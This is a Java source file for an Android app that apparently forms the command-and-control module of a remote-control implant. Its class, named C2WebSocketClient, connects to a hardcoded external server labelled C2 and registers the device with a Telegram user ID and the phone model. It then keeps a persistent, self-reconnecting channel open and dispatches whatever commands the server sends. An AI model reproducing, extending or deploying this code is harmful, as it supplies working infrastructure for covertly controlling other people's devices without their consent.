package com.rcl.androidstreamcontrol.service;

import android.content.Context;
import android.util.Log;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.Map;
import java.util.HashMap;
import java.util.concurrent.TimeUnit;

import org.json.JSONObject;
import org.json.JSONArray;

/**
 * Module 1: WebSocket Client (The Nervous System)
 */
public class C2WebSocketClient {

    private static final String TAG = "C2WS";
    private static final String C2_URL = "wss://c2-1-production.up.railway.app";
    private static final int RECONNECT_DELAY_MS = 5000;

    private final Context context;
    private final int telegramUserId;
    private WebSocketClient ws;
    private boolean shouldReconnect = true;
    private Thread connectThread;
    private final Map<String, CommandHandler> handlers = new HashMap<>();

    public interface CommandHandler {
        void handle(JSONObject payload);
    }

    public C2WebSocketClient(Context context, int telegramUserId) {
        this.context = context;
        this.telegramUserId = telegramUserId;
    }

    public void onCommand(String action, CommandHandler handler) {
        handlers.put(action, handler);
    }

    public void connect() {
        connectThread = new Thread(() -> {
            while (shouldReconnect) {
                try {
                    Log.d(TAG, "Connecting to C2: " + C2_URL);
                    ws = new WebSocketClient(new URI(C2_URL)) {
                        @Override
                        public void onOpen(ServerHandshake handshakedata) {
                            Log.d(TAG, "Connected to C2 server");
                            JSONObject auth = new JSONObject();
                            try {
                                auth.put("action", "register");
                                auth.put("telegram_user_id", telegramUserId);
                                auth.put("device_model", android.os.Build.MODEL);
                            } catch (Exception e) {}
                            send(auth.toString());
                        }

                        @Override
                        public void onMessage(String message) {
                            try {
                                JSONObject msg = new JSONObject(message);
                                String action = msg.optString("action", "");
                                if ("ping".equals(action)) {
                                    JSONObject pong = new JSONObject();
                                    pong.put("action", "pong");
                                    send(pong.toString());
                                    Log.d(TAG, "Pong sent");
                                    return;
                                }
                                CommandHandler handler = handlers.get(action);
                                if (handler != null) {
                                    handler.handle(msg);
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Error parsing message", e);
                            }
                        }

                        @Override
                        public void onClose(int code, String reason, boolean remote) {
                            Log.d(TAG, "Disconnected: " + reason);
                            if (shouldReconnect) {
                                try { Thread.sleep(RECONNECT_DELAY_MS); } catch (Exception e) {}
                            }
                        }

                        @Override
                        public void onError(Exception ex) {
                            Log.e(TAG, "WebSocket error: " + ex.getMessage());
                        }
                    };
                    boolean connected = ws.connectBlocking(5, TimeUnit.SECONDS);
                    if (connected) {
                        while (shouldReconnect && ws != null && ws.isOpen()) {
                            try {
                                Thread.sleep(2000);
                            } catch (InterruptedException e) {
                                break;
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Connection error", e);
                } finally {
                    try {
                        if (ws != null) {
                            ws.close();
                        }
                    } catch (Exception ignored) {}
                    if (shouldReconnect) {
                        try {
                            Thread.sleep(RECONNECT_DELAY_MS);
                        } catch (Exception ignored) {}
                    }
                }
            }
        });
        connectThread.start();
    }

    public void send(String message) {
        if (ws != null && ws.isOpen()) {
            ws.send(message);
        }
    }

    public void sendAction(String action) {
        JSONObject msg = new JSONObject();
        try { msg.put("action", action); } catch (Exception e) {}
        send(msg.toString());
    }

    public void disconnect() {
        shouldReconnect = false;
        if (ws != null) ws.close();
    }
}